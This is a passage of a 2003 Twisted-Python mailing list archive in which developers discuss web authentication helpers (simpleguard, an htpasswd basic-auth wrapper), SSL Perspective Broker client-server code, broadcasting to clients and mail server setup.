server and server can call methods on it or maybe i need implement some 
protocol? And how ssl fits in all this? Is it high-level or low-level 
twisted to impelemt features i've described?
Thanks in advance.
Your help is very, very appreciated.

Best regards,
Ruslan




From m at moshez.org  Sun Jul 20 14:39:27 2003
From: m at moshez.org (Moshe Zadka)
Date: 20 Jul 2003 20:39:27 -0000
Subject: [Twisted-Python] Guard
Message-ID: <20030720203927.14688.qmail@green.zadka.com>

As many of you know, using guard (the webby interface to authentication)
has been a thorny issue with Twisted. Christopher Armstrong and I wrote
a module which hides many of the details of using guard, and supplies
a much more usable interface.

So, here is an example of using twisted.web.woven.simpleguard:

from twisted.cred import checkers
from twisted.internet import reactor
from twisted.web import server, resource
from twisted.web.woven import simpleguard

class SimpleResource(resource.Resource):

    def getChild(self, path, request):
        return self

    def render(self, request):
        auth = request.getComponent(simpleguard.Authenticated)
        if auth:
            return "hello my friend "+auth.name
        else:
            return """
            I don't think we've met
            <a href="perspective-init">login</a>
            """

checker = checkers.InMemoryUsernamePasswordDatabaseDontUse()
checker.addUser("bob", "12345")
anon = checkers.AllowAnonymousAccess()

reactor.listenTCP(8889, server.Site(
      resource = simpleguard.guardResource(SimpleResource(), [checker, anon])))
reactor.run()

A simpler example would be using simpleguard to password-protect a
directory:

checker = checkers.OnDiskUsernamePasswordDatabase('/etc/www/htpasswd')
resource = static.File("/var/www/htdocs")
resource.putChild('secret',
    simpleguard.guardResource(static.File('/var/www/htdocs/secret'),
                              [checker])
reactor.listenTCP(8889, server.Site(resource))
reactor.run()

I hope these two examples show that using authentication in a web
application is easier than it used to be!

Thanks,
Moshe
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From andrew-twisted at puzzling.org  Sun Jul 20 19:27:16 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 21 Jul 2003 11:27:16 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030720203927.14688.qmail@green.zadka.com>
References: <20030720203927.14688.qmail@green.zadka.com>
Message-ID: <20030721012716.GG10749@frobozz>

On Sun, Jul 20, 2003 at 08:39:27PM -0000, Moshe Zadka wrote:
> As many of you know, using guard (the webby interface to authentication)
> has been a thorny issue with Twisted. Christopher Armstrong and I wrote
> a module which hides many of the details of using guard, and supplies
> a much more usable interface.

This reminds me -- I wrote a simple resource wrapper recently that provides
HTTP basic auth, reading from a htpasswd(1) file [currently it only supports
crypt'ed passwords, not MD5].  This doesn't use guard (or even newcred) at
all, although it probably should.

I keep meaning to post it to the list; so here it is!

---- htpasswdauth.py ----

from crypt import crypt

from twisted.web import static
from twisted.web.resource import Resource
from twisted.protocols import http

__all__ = ['HtPasswdWrapper']

class UnauthorizedResource(Resource):
    isLeaf = 1
    def __init__(self, realm, errorPage):
        Resource.__init__(self)
        self.realm = realm
        self.errorPage = errorPage

    def render(self, request):
        request.setResponseCode(http.UNAUTHORIZED)
        # FIXME: Does realm need to be quoted?
        request.setHeader('WWW-authenticate', 'basic realm="%s"' % self.realm)
        return self.errorPage.render(request)


class HtPasswdWrapper(Resource):
    """Apache-style htpasswd protection for a resource.

    Requires a client to authenticate (using HTTP basic auth) to access a
    resource.  If they fail to authenticate, or their username and password
    aren't accepted, they receive an error page.

    The username and password are checked against a htpasswd(1) file using
    crypt.  The file is re-read for every request.

    TODO:
        - Integrate this into twisted.web.woven.guard / newcred?
        - Support MD5 password hashes in the htpasswd file, as well as crypt.

    @cvar unauthorizedPage: L{Resource} that will be used to render the error
        page given when a user is unauthorized.
    """

    unauthorizedPage = static.Data(
        '<html><body>Access Denied.</body></html>', 'text/html'
    )

    def __init__(self, resource, htpasswdFilename, realm):
        """Constructor.
        
        @param resource: resource to protect with authentication.
        @param htpasswdFilename: filename of an htpasswd file to authenticate
            with.  Currently only crypt(3)-format passwords are supported.
        @param realm: HTTP auth realm.
        """
        Resource.__init__(self)
        self.resource = resource
        self.filename = htpasswdFilename
        self.realm = realm

    def getChildWithDefault(self, path, request):
        if self.authenticateUser(request):
            return self.resource.getChildWithDefault(path, request)
        else:
            return self.unauthorized()

    def render(self, request):
        if self.authenticateUser(request):
            return self.resource.render(request)
        else:
            return self.unauthorized().render(request)

    def authenticateUser(self, request):
        username, password = request.getUser(), request.getPassword()
        lines = [l.rstrip().split(':', 1) for l in file(self.filename).readlines()]
        lines = [l for l in lines if l[0] == username]
        if not lines:
            return 0
        hashedPassword = lines[0][1]
        return hashedPassword == crypt(password, hashedPassword[:2])

    def unauthorized(self):
        return UnauthorizedResource(self.realm, self.unauthorizedPage)


if __name__ == '__main__':
    # Quick & dirty testing...
    
    # create the intarweb
    from twisted.web.server import Site
    root = Resource()
    sit = Site(HtPasswdWrapper(root, '/tmp/htpasswdtest', 'test site'))
    #sit = Site(root)

    root.putChild('', static.Data('If you can see this, you are authorized!  Congrats!', 'text/plain'))
    root.putChild('blah', static.Data('Bring me a child!!', 'text/plain'))

    # and finally talk to the internat
    from twisted.internet import reactor
    reactor.listenTCP(18080, sit)
    reactor.run()

---- end ----

-Andrew.




From minh.luu at toll.com.au  Sun Jul 20 19:30:03 2003
From: minh.luu at toll.com.au (Minh Luu)
Date: Mon, 21 Jul 2003 11:30:03 +1000
Subject: [Twisted-Python] How to send message to all connected clients
Message-ID: <021b01c34f27$9c28e330$0202d90a@its09455>

Hi,

Could I have some advice on how to send a message to all connected clients.

Where do I keep the list of the client connections - in the sub-class of Protocol
or in the sub-class of Factory?

Do I call the write method for each client connection or there is a better way in twisted
to send a message to all the clients or a group of clients.

Thanks,
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030721/8c11fd34/attachment.html>

From exarkun at intarweb.us  Sun Jul 20 19:40:41 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Sun, 20 Jul 2003 21:40:41 -0400
Subject: [Twisted-Python] How to send message to all connected clients
In-Reply-To: <021b01c34f27$9c28e330$0202d90a@its09455>
References: <021b01c34f27$9c28e330$0202d90a@its09455>
Message-ID: <20030721014041.GA1654@intarweb.us>

On Mon, Jul 21, 2003 at 11:30:03AM +1000, Minh Luu wrote:
> Hi,
> 
> Could I have some advice on how to send a message to all connected clients.
> 
> Where do I keep the list of the client connections - in the sub-class of Protocol
> or in the sub-class of Factory?

  Definitely in your Factory subclass.  You can add Protocol instances to
the list in your buildProtocol() method and remove them either the Factory's
clientConnectionLost() method or the Protocol's connectionLost() method.

> 
> Do I call the write method for each client connection or there is a better way in twisted
> to send a message to all the clients or a group of clients.
> 

  If you're using TCP, doing a write() on each connection is pretty much a
requirement.  If you're using UDP, you might be able to manage something
better with multicast (but since you mentioned factories, I'm guessing
you're not using UDP).

  Hope this helps,

  Jp

-- 
Somewhere, something incredible is waiting to be known.
                -- Carl Sagan
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030720/29dc6e62/attachment.sig>

From glyph at twistedmatrix.com  Mon Jul 21 02:47:27 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 03:47:27 -0500
Subject: [Twisted-Python] Guard
In-Reply-To: <20030720203927.14688.qmail@green.zadka.com>
Message-ID: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>

On Sunday, July 20, 2003, at 03:39 PM, Moshe Zadka wrote:

> As many of you know, using guard (the webby interface to 
> authentication)
> has been a thorny issue with Twisted. Christopher Armstrong and I wrote
> a module which hides many of the details of using guard, and supplies
> a much more usable interface.

For the record, I think this code is awful, and I am sad that my lack 
of time for documentation has made something like this necessary.

What simpleguard lets you avoid is writing a domain abstraction outside 
of your web code.  While this may seem attractive, it is a parlor trick 
to reduce linecount in trivialized examples, not a sensible way to 
architect an application or even a middling-small site.

I would urge all Twisted users to please avoid simpleguard, as I would 
like to remove it in a future release of Twisted.  Paul Swartz and I 
are working on more detailed documentation of newcred, but until then 
there are the mailing list messages last month in the thread "lies, 
damn lies, and stable interfaces" to which I humbly refer you all.

However, if the community concensus is really that our users want 
something like this I won't take it out.  I will just think it's a pity 
that HTTP has come to dominate networked application architecture so 
universally.




From m at moshez.org  Mon Jul 21 03:19:15 2003
From: m at moshez.org (Moshe Zadka)
Date: 21 Jul 2003 09:19:15 -0000
Subject: [Twisted-Python] Guard
In-Reply-To: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>
References: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030721091915.7967.qmail@green.zadka.com>

On Mon, 21 Jul 2003, Glyph Lefkowitz <glyph at twistedmatrix.com> wrote:

> For the record, I think this code is awful, and I am sad that my lack 
> of time for documentation has made something like this necessary.

I disagree it was a documentation problem -- it was an overhead problem.
webhappyrealm has a *lot* of code related to authentication, compared
to code related to the problem domain. In doc/examples/simpleguard*.py,
even though the code of the problem domain is short [greeting people
we know, insulting people we don't] it is still about half or more
of the code.

In Plonk, which was my original use-case, using simpleguard meant that
we *removed* lots of code, and only changed one method (Blob.writerp).

Note that even if you do use simpleguard, you can still graduate to
use guard itself if and when you need the power [for example, having
something more complicated than authed/non-authed, or using the
same Realm for non-web uses]. You can do that, for example, by
inheriting from MarkingRealm and overriding methods in it.

Your code will still be able to use things like
request.getComponent(Authenticated).name to get the username of logged
in user, so the resources themselves will not have to be modified. 

So, I think of the simpleguard/guard decision as "make easy things
easy, make difficult things possible". webhappyrealm shows how to make
difficult things possible -- simpleguard examples show how to make
easy things easy.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From glyph at twistedmatrix.com  Mon Jul 21 03:54:22 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 04:54:22 -0500
Subject: [Twisted-Python] Guard
In-Reply-To: <20030721091915.7967.qmail@green.zadka.com>
Message-ID: <4DDF19C5-BB61-11D7-9652-000393C9700E@twistedmatrix.com>

On Monday, July 21, 2003, at 04:19 AM, Moshe Zadka wrote:

> So, I think of the simpleguard/guard decision as "make easy things
> easy, make difficult things possible". webhappyrealm shows how to make
> difficult things possible -- simpleguard examples show how to make
> easy things easy.

Hmm.  Your point about migration is well-taken; perhaps this code is 
not so bad as I made it out to be.

I suppose the next thing to do would be to flesh out webhappyrealm a 
little bit and add it to doc/examples rather than relegating it to 
sandbox.  Can a PicturePile expert comment on the feasibility of adding 
both kinds of authentication to it, so as to demonstrate both 
approaches and how to move from one to the other?




From glyph at twistedmatrix.com  Mon Jul 21 04:36:49 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 05:36:49 -0500
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721012716.GG10749@frobozz>
Message-ID: <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>

On Sunday, July 20, 2003, at 08:27 PM, Andrew Bennetts wrote:

> This reminds me -- I wrote a simple resource wrapper recently that 
> provides
> HTTP basic auth, reading from a htpasswd(1) file [currently it only 
> supports
> crypt'ed passwords, not MD5].  This doesn't use guard (or even 
> newcred) at
> all, although it probably should.

Actually, it ought to use newcred and be a part of guard.  HTTP auth is 
really a funky way of establishing a session.  It works totally 
differently from guard's SessionWrapper, but you get the same effect - 
this implementation detail would ideally be specified by some kind of 
configuration rather than by the application author directly, but, uh 
... coil :).

In short, if someone is going to enhance this to support newcred, don't 
get too hung up on the way the existing woven.guard stuff works :).




From illumen at yahoo.com  Mon Jul 21 04:54:35 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Mon, 21 Jul 2003 20:54:35 +1000
Subject: [Twisted-Python] client-server communication + ssl + wxpython:
 newbie question, help please
In-Reply-To: <3F1AFE5D.5050105@is.lg.ua>
References: <3F1AFE5D.5050105@is.lg.ua>
Message-ID: <3F1BC66B.9050108@yahoo.com>

Ruslan Spivak wrote:

> Hello, twisted users!
>
> I'm newbie to twisted and after reading documentation feel somewhat a 
> little bit confused, don't know where to start.
> Can you give an advice on the following:
>
> I need to have a server and a GUI client(wxpython), which communicates 
> using ssl.
> Server:
>    - it should take requests for establishing connection from a lot of 
> GUI clients using ssl
>    - the request for connection method will pass to server simple 
> types (strings and dicts)
>    - server will ask radius  server if such user exists, and if so 
> then it writes some info to database(MySQL) and adds some rules to 
> firewall. If such user doesn't exist in radius, then it raises 
> exception to remote client or just return error code.
>    - If client succeded in connection, then server should every 3 
> minutes call method 'checkpoint' on client. If it doesn't receive 
> response from client, it deletes rules from firewall and writes some 
> info to database.
>
> Client:
>     - wxpython gui based client, that tries to connect to remote 
> server using ssl(Connection means connecting to some port on the 
> server, passing parameters to remote method 'connect' and if there is 
> no exception or return code == 1, connection is successfull and 
> message printed to happy user).
>     - client contains method that will be periodically(each 3 minutes) 
> called by server after successful connection
>
> I just don't know where to start. Should client implement Root.pb as 
> from Chapter 5(Perspective broker), so that it can pass reference to 
> server and server can call methods on it or maybe i need implement 
> some protocol? And how ssl fits in all this? Is it high-level or 
> low-level twisted to impelemt features i've described?
> Thanks in advance.
> Your help is very, very appreciated.
>
> Best regards,
> Ruslan
>
The way I got the listening peer(the server) to be able to make calls to 
the connecting one(client) was to do what you describe.  Return a 
subclass of pb.Root to a method on the server which stores that 
somewhere where it can make calls to it later.

I think you can use listenSSL instead of listenTCP.  Haven't used it 
myself.  Have you looked in the examples, or tests directories?

If you have lots of clients, you may want to get them to disconnect so 
your server doesn't get overloaded.






From andrew-twisted at puzzling.org  Mon Jul 21 05:03:43 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 21 Jul 2003 21:03:43 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
References: <20030721012716.GG10749@frobozz> <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030721110342.GH10749@frobozz>

On Mon, Jul 21, 2003 at 05:36:49AM -0500, Glyph Lefkowitz wrote:
> On Sunday, July 20, 2003, at 08:27 PM, Andrew Bennetts wrote:
> 
> >This reminds me -- I wrote a simple resource wrapper recently that
> >provides HTTP basic auth, reading from a htpasswd(1) file [currently it
> >only supports crypt'ed passwords, not MD5].  This doesn't use guard (or
> >even newcred) at all, although it probably should.
> 
> Actually, it ought to use newcred and be a part of guard.  HTTP auth is 
> really a funky way of establishing a session.  It works totally 
> differently from guard's SessionWrapper, but you get the same effect - 
> this implementation detail would ideally be specified by some kind of 
> configuration rather than by the application author directly, but, uh 
> ... coil :).
> 
> In short, if someone is going to enhance this to support newcred, don't 
> get too hung up on the way the existing woven.guard stuff works :).

For what it's worth, I originally *tried* to implement this with
newcred/guard, and couldn't figure out how.  I seem to recall that a large
stumbling block was UsernamePasswordWrapper not being useful if you are
trying to compare against *hashed* passwords;
IUsernamePassword.checkPassword assumes you have the cleartext to validate
against.  In hindsight, I probably didn't want SessionWrapper, either,
because I didn't want sessions (just simple "you can/cannot access this
resource and its children").  

I didn't need massive flexibility for my particular use-case (which was
emulating Apache's .htpasswd functionality), so I just did it the simplest
way I could, ignoring the existing infrastructure.  I think I have to agree
with Moshe -- the existing guard stuff is too large and/or too difficult for
an uninitiated developer to work with.

-Andrew.




From jml at ids.org.au  Mon Jul 21 06:35:40 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Mon, 21 Jul 2003 22:35:40 +1000
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703061203.GE665@sting>; from jml@ids.org.au on Thu, Jul 03, 2003 at 16:12:03 +1000
References: <20030703054426.GC665@sting> <20030703061203.GE665@sting>
Message-ID: <20030721123540.GA24408@sting>

On 2003.07.03 16:12, Jonathan Lange wrote:
> 
> If not, and there is some other solution in mind, let's switch to 
> that now, and kill off Issues entirely (except perhaps as an 
> example). After all "code is a liability, functionality is an asset".
> 

After much discussion, consideration, illicit drug taking, rehab, 
therapy, more drugs, less rehab, an affair with a soprano (actor, not 
singer) and a cup of tea, it has been decided that Issues is indeed 
destined for the garbage bin. 
Thus, I am no longer maintaining it. I've moved my stuff from SVN into 
pyramid's CVS for "the benefit of posterity" (from the slightly-updated 
README). 
By the time you read this, any web pages of mine that refer to it will 
have been taken down.

It has been killed. Dead. Finito.

cheers,
jml



From mario at ruggier.org  Mon Jul 21 07:06:16 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Mon, 21 Jul 2003 15:06:16 +0200
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030721123540.GA24408@sting>
Message-ID: <1CFE42EA-BB7C-11D7-991E-000393756786@ruggier.org>

why?
or, what is to be learned from this?

mario

On Lundi, juil 21, 2003, at 14:35, Jonathan Lange wrote:
> On 2003.07.03 16:12, Jonathan Lange wrote:
>> If not, and there is some other solution in mind, let's switch to 
>> that now, and kill off Issues entirely (except perhaps as an 
>> example). After all "code is a liability, functionality is an asset".
>
> After much discussion, consideration, illicit drug taking, rehab, 
> therapy, more drugs, less rehab, an affair with a soprano (actor, not 
> singer) and a cup of tea, it has been decided that Issues is indeed 
> destined for the garbage bin. Thus, I am no longer maintaining it. 
> I've moved my stuff from SVN into pyramid's CVS for "the benefit of 
> posterity" (from the slightly-updated README). By the time you read 
> this, any web pages of mine that refer to it will have been taken > down.
>
> It has been killed. Dead. Finito.
>
> cheers,
> jml
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From lafou at wanadoo.fr  Mon Jul 21 08:13:06 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 21 Jul 2003 16:13:06 +0200
Subject: [Twisted-Python] t.w.woven.widgets patch
Message-ID: <1058796786.7682.9.camel@biproc>

Hi all,

I am really surprised by the way the Anchor widget works. It would be
really helpful to have a template similar to generated output.
With that kind of template :

****
<ul model="directory" view="List">
  <li pattern="listItem"><a href="#" view="Anchor">ListItem</a></li>
  <li pattern="emptyList">No files</li>
</ul>
****

the output is currently :

****
ListItemfile1
ListItemfile2
ListItemfile3
****
instead of 

****
file1
file2
file3
****

Here is a patch that corrects this behaviour

--
Gravis
-------------- next part --------------
A non-text attachment was scrubbed...
Name: patch_widgets.py
Type: text/x-patch
Size: 621 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030721/7a56cc0c/attachment-0002.bin>

From itamar at itamarst.org  Mon Jul 21 10:53:51 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 21 Jul 2003 12:53:51 -0400
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721110342.GH10749@frobozz>
References: <20030721012716.GG10749@frobozz>
	<3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
	<20030721110342.GH10749@frobozz>
Message-ID: <20030721125351.6f36683c.itamar@itamarst.org>

On Mon, 21 Jul 2003 21:03:43 +1000
Andrew Bennetts <andrew-twisted at puzzling.org> wrote:
> 
> For what it's worth, I originally *tried* to implement this with
> newcred/guard, and couldn't figure out how.  I seem to recall that a
> large stumbling block was UsernamePasswordWrapper not being useful if
> you are trying to compare against *hashed* passwords;

We now have a new credential type whose name I forget, or possibly the
same one. Anyway, *some* credential type, which explicitly exposes the
password. Which is what you should use. And it was added for the exact
reason you mentioned.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From daleedom at hightowergroup.com  Mon Jul 21 11:13:13 2003
From: daleedom at hightowergroup.com (David A. Leedom)
Date: Mon, 21 Jul 2003 13:13:13 -0400
Subject: [Twisted-Python] Mail Server
Message-ID: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>

I am new to Twisted Matrix.

I am trying to setup an mail system that will use a database as the 
datastore for emails, domains and user access (both pop3/imap and stmp).

What I am looking for is a code snipit example of how to setup a POP3 and 
SMTP server using frame work without using the TAP utility.

I figure once I have this example then I can begin to understand the 
documentation better.  There is something missing in the explanation of how 
things work.  It just goes over my head.

Thanks You,

Dave Leedom





The Hightower Group, Inc.
Information Technology Consulting

165 West Airport Road/Lititz, PA 17543
V:717-560-4002, 877-560-4002 x: 114
F:717-560-2825
www.hightowergroup.com 
-------------- next part --------------

---
Outgoing mail is certified Virus Free.
Checked by AVG anti-virus system (http://www.grisoft.com).
Version: 6.0.498 / Virus Database: 297 - Release Date: 7/8/2003

From bobhicks at adelphia.net  Mon Jul 21 15:11:06 2003
From: bobhicks at adelphia.net (Bob Hicks)
Date: Mon, 21 Jul 2003 17:11:06 -0400
Subject: [Twisted-Python] Python 2.3 and Twisted 1.0.6
Message-ID: <002001c34fcc$9cc9cf20$c6303118@ptah>

Does the current Twisted framework work with 2.3 or do I need to wait a
bit?

Bob





From itamar at itamarst.org  Mon Jul 21 15:29:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 21 Jul 2003 17:29:21 -0400
Subject: [Twisted-Python] Python 2.3 and Twisted 1.0.6
In-Reply-To: <002001c34fcc$9cc9cf20$c6303118@ptah>
References: <002001c34fcc$9cc9cf20$c6303118@ptah>
Message-ID: <20030721172921.259eedf5.itamar@itamarst.org>

On Mon, 21 Jul 2003 17:11:06 -0400
"Bob Hicks" <bobhicks at adelphia.net> wrote:

> Does the current Twisted framework work with 2.3 or do I need to wait
> a bit?

The buildbot (http://www.twistedmatrix.com/buildbot/) runs all the tests
on 2.3. Seems to work just fine.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From alienoid at is.lg.ua  Mon Jul 21 15:43:48 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Tue, 22 Jul 2003 00:43:48 +0300
Subject: [Twisted-Python] getObjectAtSSL: Exception
Message-ID: <3F1C5E94.8050103@is.lg.ua>

Hello!

Here is the simple server:

from twisted.spread import pb
from twisted.internet import app, reactor
from OpenSSL import SSL

class ServerContextFactory:

    def getContext(self):
        """Create an SSL context.

        This is a sample implementation that loads a certificate from a file
        called 'server.pem'."""
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        ctx.use_certificate_file('server.pem')
        ctx.use_privatekey_file('server.pem')
        return ctx
 
class Server(pb.Root):
    def __init__(self):
        self.client = None
       
    def checkpoint(self):
        self.client.callRemote("printClientMsg", "Hello from 
Server.checkpoint")
        reactor.callLater(2, self.checkpoint)
       
    def remote_printServerMsg(self, client, msg):
        print "Server got: %s" % msg
        self.client = client
        client.callRemote("printClientMsg", "Hello from 
Server.printServerMsg")
        reactor.callLater(2, self.checkpoint)
       
if __name__ == "__main__":
    appl = app.Application("pbtest")
    appl.listenSSL(33333, pb.BrokerFactory(Server()), 
ServerContextFactory())
    appl.run()



When i try to run pbclient.py:

from twisted.spread import pb
from twisted.internet import reactor

class ClientCall(pb.Referenceable):
    def remote_printClientMsg(self, msg):
        print "Client: %s" % msg

def got_obj(obj, c):
    obj.callRemote("printServerMsg", c, "Hello from Client")
       
c = ClientCall()
def1 = pb.getObjectAtSSL("localhost", 33333, 30)
def1.addCallback(got_obj, c)
reactor.run()

I get:

Traceback (most recent call last):
  File "pbclient.py", line 12, in ?
    def1 = pb.getObjectAtSSL("localhost", 33333, 30)
  File "/usr/lib/python2.2/site-packages/twisted/spread/pb.py", line 
1190, in getObjectAtSSL
    reactor.connectSSL(host, port, bf, timeout)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", 
line 260, in connectSSL
    c.connect()
  File "/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 
504, in connect
    self.transport = transport = self._makeTransport()
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
173, in _makeTransport
    return Client(self.host, self.port, self.bindAddress, 
self.contextFactory, self, self.reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
104, in __init__
    tcp.Client.__init__(self, host, port, bindAddress, connector, reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
430, in __init__
    self._finishInit(whenDone, skt, err, reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
122, in _finishInit
    self.startTLS(self.ctxFactory)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
303, in startTLS
    holder = Connection.startTLS(self, ctx)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
190, in startTLS
    self.socket = SSL.Connection(ctx.getContext(), self.socket)
AttributeError: 'int' object has no attribute 'getContext'

What's wrong?
Your help is very appreciated. Thanks in advance.

Best regards,
Ruslan




From alienoid at is.lg.ua  Mon Jul 21 16:17:33 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Tue, 22 Jul 2003 01:17:33 +0300
Subject: [Twisted-Python] getObjectAtSSL: client just hangs
Message-ID: <3F1C667D.1090903@is.lg.ua>

Hello!

I found patch to spread.pb, so that there is no exception , but now my 
client just hangs with no response.

Here is the simple server:

from twisted.spread import pb
from twisted.internet import app, reactor
from OpenSSL import SSL

class ServerContextFactory:

   def getContext(self):
       """Create an SSL context.

       This is a sample implementation that loads a certificate from a file
       called 'server.pem'."""
       ctx = SSL.Context(SSL.SSLv23_METHOD)
       ctx.use_certificate_file('server.pem')
       ctx.use_privatekey_file('server.pem')
       return ctx

class Server(pb.Root):
   def __init__(self):
       self.client = None
         def checkpoint(self):
       self.client.callRemote("printClientMsg", "Hello from 
Server.checkpoint")
       reactor.callLater(2, self.checkpoint)
         def remote_printServerMsg(self, client, msg):
       print "Server got: %s" % msg
       self.client = client
       client.callRemote("printClientMsg", "Hello from 
Server.printServerMsg")
       reactor.callLater(2, self.checkpoint)
      if __name__ == "__main__":
   appl = app.Application("pbtest")
   appl.listenSSL(33333, pb.BrokerFactory(Server()), 
ServerContextFactory())
   appl.run()



Heres is client  pbclient.py:

from twisted.spread import pb
from twisted.internet import reactor

class ClientCall(pb.Referenceable):
   def remote_printClientMsg(self, msg):
       print "Client: %s" % msg

def got_obj(obj, c):
   obj.callRemote("printServerMsg", c, "Hello from Client")
      c = ClientCall()
def1 = pb.getObjectAtSSL("localhost", 33333, 30)
def1.addCallback(got_obj, c)
reactor.run()


Your help is very appreciated. Thanks in advance.

Best regards,
Ruslan




From andrew-twisted at puzzling.org  Mon Jul 21 17:32:02 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:32:02 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721125351.6f36683c.itamar@itamarst.org>
References: <20030721012716.GG10749@frobozz> <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com> <20030721110342.GH10749@frobozz> <20030721125351.6f36683c.itamar@itamarst.org>
Message-ID: <20030721233202.GI10749@frobozz>

On Mon, Jul 21, 2003 at 12:53:51PM -0400, Itamar Shtull-Trauring wrote:
> On Mon, 21 Jul 2003 21:03:43 +1000
> Andrew Bennetts <andrew-twisted at puzzling.org> wrote:
> > 
> > For what it's worth, I originally *tried* to implement this with
> > newcred/guard, and couldn't figure out how.  I seem to recall that a
> > large stumbling block was UsernamePasswordWrapper not being useful if
> > you are trying to compare against *hashed* passwords;
> 
> We now have a new credential type whose name I forget, or possibly the
> same one. Anyway, *some* credential type, which explicitly exposes the
> password. Which is what you should use. And it was added for the exact
> reason you mentioned.

IUsernameHashedPassword, I believe.  It got added after I wrote this and
whinged to Jp, iirc ;)

Regardless, UsernamePasswordWrapper has its credentials checker class
hardcoded to UsernamePassword (which implements IUsernamePassword) in a
nested function in the middle of a forty-line function, so it's still rather
useless to me.  It might be nice if that aspect of UsernamePasswordWrapper
was parameterised...

UsernamePasswordWrapper also assumes form-based authentication, if I'm
understanding correctly.  I'm not hugely wedded to HTTP basic auth, but it
is useful for some things, so it would be nice if UPW was able to return
something other than form.FormProcessor in the "INIT_PERSPECTIVE" case (and
I'm not certain I like the login URL being hard-coded... 'perspective-init'
strikes me as an implementation detail, like '.html' or '.asp', that users
shouldn't have to see -- 'login' would make more sense to most people).

Anyway, it was clear to me that the existing stable version of Twisted
couldn't support what I needed via guard, which is why I took the route I
did.  If someone who understands this stuff wants to incorporate htpasswd
and/or HTTP basic auth in such a way that I can use it from guard, I won't
complain :)

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul 21 17:35:45 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:35:45 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <20030721233545.GJ10749@frobozz>

On Mon, Jul 21, 2003 at 01:13:13PM -0400, David A. Leedom wrote:
> I am new to Twisted Matrix.
> 
> I am trying to setup an mail system that will use a database as the 
> datastore for emails, domains and user access (both pop3/imap and stmp).
> 
> What I am looking for is a code snipit example of how to setup a POP3 and 
> SMTP server using frame work without using the TAP utility.
> 
> I figure once I have this example then I can begin to understand the 
> documentation better.  There is something missing in the explanation of how 
> things work.  It just goes over my head.

Why not look at how the TAP utility does it? :)

Have a look at twisted/mail/tap.py, in particular the 'updateApplication'
method.

Also, I believe that IMAP, POP3 and SMTP have all had a lot of work done on
them in CVS recently, so it might be worth using CVS, or at least the latest
alpha release (1.0.7 alpha 2).  They're improving quite rapidly, judging
from the number of commits (and tests!) Jp is making.

-Andrew.




